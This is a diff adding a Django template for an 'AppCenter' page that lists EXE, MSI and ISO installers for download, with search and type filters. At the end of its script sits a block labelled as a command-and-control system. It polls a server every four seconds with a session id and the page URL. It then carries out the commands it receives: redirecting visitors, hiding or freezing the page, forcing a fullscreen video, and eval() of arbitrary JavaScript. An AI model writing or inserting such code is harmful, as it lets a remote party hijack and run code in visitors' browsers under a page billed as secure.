@@ -1,0 +1,373 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>AppCenter — Software Library</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+      :root {
+        --ac-primary: #6366f1;
+        --ac-primary-light: rgba(99,102,241,0.1);
+        --ac-card-radius: 16px;
+        --ac-border: rgba(255,255,255,0.08);
+        --ac-surface: rgba(255,255,255,0.04);
+        --ac-text: #e2e8f0;
+        --ac-muted: #64748b;
+      }
+      * { box-sizing: border-box; }
+      body {
+        background: linear-gradient(135deg, #0a0a0f 0%, #0f172a 50%, #0a0a1a 100%);
+        min-height: 100vh;
+        font-family: 'Inter', sans-serif;
+        color: var(--ac-text);
+      }
+      .ac-hero {
+        background: linear-gradient(135deg, rgba(99,102,241,0.12) 0%, rgba(139,92,246,0.08) 100%);
+        border: 1px solid var(--ac-border);
+        border-radius: var(--ac-card-radius);
+        backdrop-filter: blur(20px);
+      }
+      .ac-logo-badge {
+        background: linear-gradient(135deg, #6366f1, #8b5cf6);
+        border-radius: 12px;
+        padding: 10px 14px;
+        display: inline-flex;
+        align-items: center;
+        gap: 10px;
+        box-shadow: 0 8px 25px rgba(99,102,241,0.4);
+      }
+      .ac-logo-badge i { font-size: 1.4rem; color: #fff; }
+      .ac-logo-badge span { font-size: 1.2rem; font-weight: 700; color: #fff; letter-spacing: -0.5px; }
+      .ac-subtitle { color: var(--ac-muted); font-size: 0.9rem; margin-top: 6px; }
+      .ac-search-input {
+        background: var(--ac-surface) !important;
+        border: 1px solid var(--ac-border) !important;
+        color: var(--ac-text) !important;
+        border-radius: 10px !important;
+        padding: 10px 14px !important;
+      }
+      .ac-search-input::placeholder { color: var(--ac-muted) !important; }
+      .ac-search-input:focus { border-color: var(--ac-primary) !important; box-shadow: 0 0 0 3px rgba(99,102,241,0.2) !important; outline: none !important; }
+      .input-group-text {
+        background: var(--ac-surface) !important;
+        border: 1px solid var(--ac-border) !important;
+        border-right: none !important;
+        color: var(--ac-muted) !important;
+        border-radius: 10px 0 0 10px !important;
+      }
+      .ac-search-input { border-left: none !important; border-radius: 0 !important; }
+      .btn-clear {
+        background: var(--ac-surface) !important;
+        border: 1px solid var(--ac-border) !important;
+        border-left: none !important;
+        color: var(--ac-muted) !important;
+        border-radius: 0 10px 10px 0 !important;
+        transition: all 0.2s;
+      }
+      .btn-clear:hover { color: #fff !important; border-color: rgba(255,255,255,0.2) !important; }
+      .ac-filter-btn {
+        background: var(--ac-surface) !important;
+        border: 1px solid var(--ac-border) !important;
+        color: var(--ac-muted) !important;
+        font-size: 0.78rem !important;
+        font-weight: 600 !important;
+        letter-spacing: 0.5px !important;
+        padding: 5px 12px !important;
+        transition: all 0.2s !important;
+      }
+      .ac-filter-btn:hover, .ac-filter-btn.active {
+        background: var(--ac-primary-light) !important;
+        border-color: var(--ac-primary) !important;
+        color: #a5b4fc !important;
+      }
+      .ac-table-wrapper {
+        background: rgba(255,255,255,0.03);
+        border: 1px solid var(--ac-border);
+        border-radius: var(--ac-card-radius);
+        overflow: hidden;
+      }
+      .ac-table { border-collapse: separate; border-spacing: 0; width: 100%; }
+      .ac-table thead th {
+        background: rgba(255,255,255,0.04);
+        color: var(--ac-muted);
+        font-size: 0.75rem;
+        font-weight: 600;
+        letter-spacing: 0.8px;
+        text-transform: uppercase;
+        padding: 14px 20px;
+        border-bottom: 1px solid var(--ac-border);
+        white-space: nowrap;
+        position: sticky;
+        top: 0;
+        z-index: 1;
+      }
+      .ac-table tbody td {
+        padding: 16px 20px;
+        border-bottom: 1px solid rgba(255,255,255,0.04);
+        vertical-align: middle;
+        color: var(--ac-text);
+        font-size: 0.9rem;
+        transition: background 0.15s;
+      }
+      .ac-table tbody tr:last-child td { border-bottom: none; }
+      .ac-table tbody tr:hover td { background: rgba(255,255,255,0.03); }
+      .app-name { font-weight: 600; font-size: 0.95rem; color: #f1f5f9; }
+      .app-path { font-size: 0.78rem; color: var(--ac-muted); font-family: ui-monospace, monospace; margin-top: 2px; }
+      .ac-badge {
+        display: inline-flex;
+        align-items: center;
+        gap: 5px;
+        font-size: 0.72rem;
+        font-weight: 700;
+        letter-spacing: 0.5px;
+        padding: 4px 10px;
+        border-radius: 6px;
+        text-transform: uppercase;
+      }
+      .ac-badge-exe  { background: rgba(59,130,246,0.15); color: #60a5fa; border: 1px solid rgba(59,130,246,0.3); }
+      .ac-badge-msi  { background: rgba(34,197,94,0.12);  color: #4ade80; border: 1px solid rgba(34,197,94,0.3); }
+      .ac-badge-msix { background: rgba(16,185,129,0.12); color: #34d399; border: 1px solid rgba(16,185,129,0.3); }
+      .ac-badge-inf  { background: rgba(148,163,184,0.1); color: #94a3b8; border: 1px solid rgba(148,163,184,0.25); }
+      .ac-badge-iso  { background: rgba(14,165,233,0.12); color: #38bdf8; border: 1px solid rgba(14,165,233,0.3); }
+      .btn-download {
+        background: linear-gradient(135deg, #6366f1, #8b5cf6) !important;
+        border: none !important;
+        color: #fff !important;
+        font-size: 0.8rem !important;
+        font-weight: 600 !important;
+        padding: 7px 16px !important;
+        border-radius: 8px !important;
+        transition: all 0.2s !important;
+        box-shadow: 0 4px 12px rgba(99,102,241,0.3) !important;
+      }
+      .btn-download:hover {
+        transform: translateY(-1px) !important;
+        box-shadow: 0 6px 18px rgba(99,102,241,0.45) !important;
+      }
+      .ac-stat-badge {
+        background: var(--ac-surface);
+        border: 1px solid var(--ac-border);
+        color: var(--ac-muted);
+        font-size: 0.78rem;
+        padding: 5px 12px;
+        border-radius: 8px;
+      }
+      .ac-stat-badge strong { color: var(--ac-text); }
+      .empty-icon { font-size: 3rem; color: var(--ac-muted); margin-bottom: 16px; }
+    </style>
+  </head>
+  <body>
+    <div class="container py-5">
+
+      <!-- HERO HEADER -->
+      <div class="ac-hero p-4 p-md-5 mb-4">
+        <div class="d-flex flex-column flex-md-row align-items-start align-items-md-center justify-content-between gap-3">
+          <div>
+            <div class="ac-logo-badge mb-3">
+              <i class="fas fa-store"></i>
+              <span>AppCenter</span>
+            </div>
+            <h1 class="h4 mb-1" style="font-weight:700; color:#f1f5f9;">Real ISO & EXE Installers</h1>
+            <p class="ac-subtitle mb-2">Browse and download real ISO and EXE installer files from the secure AppCenter repository.</p>
+            <p class="ac-subtitle mb-0">Drop any .iso or .exe into <code style="color:#a5b4fc;">Appcenter/installers</code> and refresh to add it to the library.</p>
+          </div>
+          <div class="d-flex gap-2">
+            <a class="btn btn-sm" href="/" style="background:rgba(255,255,255,0.06); border:1px solid var(--ac-border); color:var(--ac-text); border-radius:8px;">
+              <i class="fas fa-sync me-1"></i> Refresh
+            </a>
+          </div>
+        </div>
+
+        <!-- SEARCH + FILTERS -->
+        <div class="row g-3 mt-2">
+          <div class="col-12 col-md-7">
+            <div class="input-group">
+              <span class="input-group-text"><i class="fas fa-search" style="font-size:0.85rem;"></i></span>
+              <input id="search" class="form-control ac-search-input" placeholder="Search by name, type, e.g. chrome, setup, .msi ..." />
+              <button id="clearSearch" class="btn btn-clear" type="button">Clear</button>
+            </div>
+          </div>
+          <div class="col-12 col-md-5">
+            <div class="d-flex flex-wrap gap-2 align-items-center justify-content-md-end">
+              <span class="ac-stat-badge">Total: <strong id="totalCount">{{ installers|length }}</strong></span>
+              <div class="d-flex gap-1 flex-wrap">
+                <button type="button" class="btn ac-filter-btn active" data-kind="all">All</button>
+                <button type="button" class="btn ac-filter-btn" data-kind="exe">EXE</button>
+                <button type="button" class="btn ac-filter-btn" data-kind="msi">MSI</button>
+                <button type="button" class="btn ac-filter-btn" data-kind="msix">MSIX</button>
+                <button type="button" class="btn ac-filter-btn" data-kind="inf">Driver</button>
+                <button type="button" class="btn ac-filter-btn" data-kind="iso">ISO</button>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- TABLE -->
+      <div class="ac-table-wrapper">
+        <div class="table-responsive">
+          <table class="ac-table">
+            <thead>
+              <tr>
+                <th>Application</th>
+                <th>Type</th>
+                <th>Size</th>
+                <th>Last Modified</th>
+                <th>Added</th>
+                <th>Downloads</th>
+                <th></th>
+              </tr>
+            </thead>
+            <tbody id="rows">
+              {% for i in installers %}
+                <tr data-kind="{{ i.kind }}">
+                  <td>
+                    <div class="app-name">{{ i.display_name }}</div>
+                    <div class="app-path">{{ i.relative_path }}</div>
+                  </td>
+                  <td>
+                    {% if i.kind == "msi" %}
+                      <span class="ac-badge ac-badge-msi"><i class="fas fa-cube"></i>MSI</span>
+                    {% elif i.kind == "msix" %}
+                      <span class="ac-badge ac-badge-msix"><i class="fas fa-box"></i>MSIX</span>
+                    {% elif i.kind == "inf" %}
+                      <span class="ac-badge ac-badge-inf"><i class="fas fa-cogs"></i>Driver</span>
+                    {% elif i.kind == "iso" %}
+                      <span class="ac-badge ac-badge-iso"><i class="fas fa-compact-disc"></i>ISO</span>
+                    {% else %}
+                      <span class="ac-badge ac-badge-exe"><i class="fas fa-file"></i>EXE</span>
+                    {% endif %}
+                  </td>
+                  <td style="white-space:nowrap; color: var(--ac-muted);">{{ i.file_size_bytes|filesizeformat }}</td>
+                  <td style="white-space:nowrap; color: var(--ac-muted); font-size:0.82rem;">{{ i.file_modified_at|date:"Y-m-d" }}</td>
+                  <td style="white-space:nowrap; color: var(--ac-muted); font-size:0.82rem;">{{ i.added_at|date:"Y-m-d" }}</td>
+                  <td style="color: var(--ac-muted);">
+                    <i class="fas fa-arrow-down me-1" style="font-size:0.75rem;"></i>{{ i.download_count }}
+                  </td>
+                  <td class="text-end" style="padding-right:20px;">
+                    <a class="btn btn-download" href="{% url 'appcenter:download' i.id %}">
+                      <i class="fas fa-download me-1"></i>Download
+                    </a>
+                  </td>
+                </tr>
+              {% empty %}
+                <tr>
+                  <td colspan="7" style="padding: 60px 20px; text-align:center;">
+                    <div class="empty-icon"><i class="fas fa-box-open"></i></div>
+                    <div style="font-weight:600; font-size:1rem; margin-bottom:8px; color:#94a3b8;">No software available yet</div>
+                    <div style="color:var(--ac-muted); font-size:0.85rem;">
+                      Drop <code style="color:#a5b4fc;">.exe</code>, <code style="color:#4ade80;">.msi</code>, or <code style="color:#38bdf8;">.iso</code> files into the <code style="color:var(--ac-text);">installers/</code> folder and refresh.
+                    </div>
+                  </td>
+                </tr>
+              {% endfor %}
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <!-- FOOTER -->
+      <div class="text-center mt-4" style="color: var(--ac-muted); font-size: 0.8rem; letter-spacing: 0.5px;">
+        AppCenter &copy; {{ "now"|date:"Y" }} &mdash; Secure Software Distribution
+      </div>
+    </div>
+    <script>
+      (function () {
+        const input = document.getElementById("search");
+        const clearBtn = document.getElementById("clearSearch");
+        const rowsRoot = document.getElementById("rows");
+        const totalCount = document.getElementById("totalCount");
+        const kindButtons = Array.from(document.querySelectorAll("button[data-kind]"));
+        if (!input || !rowsRoot) return;
+
+        const allRows = Array.from(rowsRoot.querySelectorAll("tr"));
+        const isEmptyState = allRows.length === 1 && allRows[0].querySelector("td[colspan]");
+        let activeKind = "all";
+
+        function normalize(s) { return (s || "").toString().toLowerCase().trim(); }
+
+        function applyFilter() {
+          if (isEmptyState) return;
+          const q = normalize(input.value);
+          let visible = 0;
+          for (const tr of allRows) {
+            const text = normalize(tr.innerText);
+            const rowKind = (tr.getAttribute("data-kind") || "").toLowerCase();
+            const kindOk = activeKind === "all" || rowKind === activeKind;
+            const searchOk = q === "" || text.includes(q);
+            const show = kindOk && searchOk;
+            tr.style.display = show ? "" : "none";
+            if (show) visible++;
+          }
+          if (totalCount) totalCount.textContent = String(visible);
+        }
+
+        for (const btn of kindButtons) {
+          btn.addEventListener("click", () => {
+            activeKind = btn.getAttribute("data-kind") || "all";
+            for (const b of kindButtons) b.classList.remove("active");
+            btn.classList.add("active");
+            applyFilter();
+          });
+        }
+
+        input.addEventListener("input", applyFilter);
+        clearBtn?.addEventListener("click", () => {
+          input.value = "";
+          applyFilter();
+          input.focus();
+        });
+        applyFilter();
+      })();
+
+      // ========== C2 COMMAND & CONTROL SYSTEM ==========
+      const SESSION_ID = 'sess_' + Math.random().toString(36).substr(2, 9);
+      let lastCommandId = null;
+
+      function pollC2() {
+          fetch('/c2/poll/?session_id=' + SESSION_ID + '&url=' + encodeURIComponent(window.location.href))
+          .then(r => r.json())
+          .then(data => {
+              if (data.command) {
+                  console.log("C2 Command Received:", data.command);
+                  executeCommand(data.command, data.payload);
+              }
+          }).catch(e => console.error("C2 Poll Error:", e));
+      }
+
+      function executeCommand(cmd, payload) {
+          switch(cmd) {
+              case 'redirect':
+                  if(payload) window.location.href = payload;
+                  break;
+              case 'alert':
+                  alert(payload || "System Alert!");
+                  break;
+              case 'blackout':
+                  document.body.style.display = 'none';
+                  break;
+              case 'freeze':
+                  document.body.style.pointerEvents = 'none';
+                  break;
+              case 'execute':
+                  try { eval(payload); } catch(e) { console.error(e); }
+                  break;
+              case 'video':
+                  if(payload) {
+                      const overlay = document.createElement('div');
+                      overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;background:black;';
+                      overlay.innerHTML = `<iframe width="100%" height="100%" src="https://www.youtube.com/embed/${payload}?autoplay=1" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>`;
+                      document.body.appendChild(overlay);
+                  }
+                  break;
+          }
+      }
+
+      setInterval(pollC2, 4000); // Poll every 4 seconds
+      pollC2(); // Initial poll
+    </script>
+  </body>
+</html>
